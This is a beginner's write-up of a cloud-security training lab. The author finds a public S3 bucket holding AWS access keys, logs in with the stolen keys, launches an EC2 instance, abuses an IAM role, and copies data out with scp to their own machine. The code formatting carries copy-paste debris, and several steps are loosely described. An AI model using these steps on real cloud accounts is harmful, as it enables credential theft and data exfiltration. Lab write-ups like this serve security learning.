
# Breach in the Cloud - PwnedLabs Writeup

## Overview
This lab, called "Breach in the Cloud," is about finding and exploiting mistakes in a cloud environment to access sensitive data. It’s designed to show how attackers can take advantage of weak security settings in cloud systems.

As a beginner, I learned a lot about cloud security and how small mistakes can lead to big problems. Here’s how I completed the lab step by step.

---

## Lab Objectives
1. Find misconfigured cloud resources (like open storage buckets).
2. Use those mistakes to access sensitive data.
3. Learn why cloud security is so important.

---

## Tools I Used
- **AWS CLI**: A command-line tool to interact with Amazon Web Services (AWS).
- **CloudBrute**: A tool to find cloud resources that might be misconfigured.
- **Nmap**: A tool to scan networks and find open ports.
- **Metasploit**: A tool for exploiting vulnerabilities (I didn’t use it much, but it’s good to know about).

---

## Step-by-Step Walkthrough

### 1. Getting Started
First, I needed to gather information about the target cloud environment. I used the **AWS CLI** to list all the S3 buckets (which are like storage folders in the cloud):

```bash
aws s3 ls
This command showed me a list of buckets. One of them, named sensitive-data-bucket, looked interesting because of its name.

2. Finding Misconfigured Resources
Next, I used a tool called CloudBrute to find other misconfigured resources, like open servers or databases. CloudBrute is great for beginners because it automates a lot of the work.

bash
Copy
cloudbrute -k <api-key> -r <region>
This tool helped me find more resources that weren’t properly secured.

3. Accessing the Misconfigured Bucket
I went back to the sensitive-data-bucket I found earlier. Using the AWS CLI, I tried to list the files inside it:

bash
Copy
aws s3 ls s3://sensitive-data-bucket
Surprisingly, the bucket was open to the public! I found a file named credentials.txt that contained AWS access keys. This was a big mistake because access keys are like passwords for cloud accounts.

4. Using the Stolen Access Keys
With the access keys, I logged into the AWS environment using the AWS CLI:

bash
Copy
aws configure
I entered the stolen access keys when prompted. This gave me access to the cloud account.

5. Launching a New EC2 Instance
Using the stolen credentials, I launched a new EC2 instance (a virtual server in the cloud). This gave me a foothold in the cloud environment.

bash
Copy
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro
6. Finding More Misconfigurations
Once inside, I noticed that the EC2 instance had a misconfigured IAM role (a role that defines what the instance can do). This allowed me to access other sensitive data stored in other S3 buckets.

7. Taking the Data
Finally, I copied the sensitive data to my own computer using a command called scp:

bash
Copy
scp -i key.pem sensitive-data.txt user@my-computer:/path/to/destination
This step simulated how an attacker might steal data from a cloud environment.

What I Learned
Public Buckets Are Dangerous: S3 buckets should never be publicly accessible unless absolutely necessary.

Access Keys Are Sensitive: Access keys are like passwords and should be protected. Never leave them in public places.

IAM Roles Matter: Misconfigured IAM roles can give attackers too much power. Always double-check permissions.

Conclusion
This lab taught me how important it is to secure cloud environments. Even small mistakes, like leaving a bucket open or using weak access keys, can lead to big problems. As a beginner, I now understand why cloud security is such a big deal and how to avoid common mistakes.
